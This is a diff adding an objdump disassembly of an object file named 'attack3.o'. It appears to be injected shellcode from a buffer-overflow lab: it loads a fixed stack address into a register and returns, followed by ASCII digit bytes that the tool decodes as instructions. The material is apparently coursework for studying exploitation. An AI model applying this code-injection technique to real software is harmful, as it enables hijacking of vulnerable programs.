@@ -1,0 +1,15 @@
+
+attack3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 00 ac 61 55 	mov    $0x5561ac00,%rdi
+   7:	c3                   	retq   
+   8:	31 38                	xor    %edi,(%rax)
+   a:	38 31                	cmp    %dh,(%rcx)
+   c:	31 37                	xor    %esi,(%rdi)
+   e:	32 38                	xor    (%rax),%bh
+  10:	35                   	.byte 0x35
+  11:	35                   	.byte 0x35
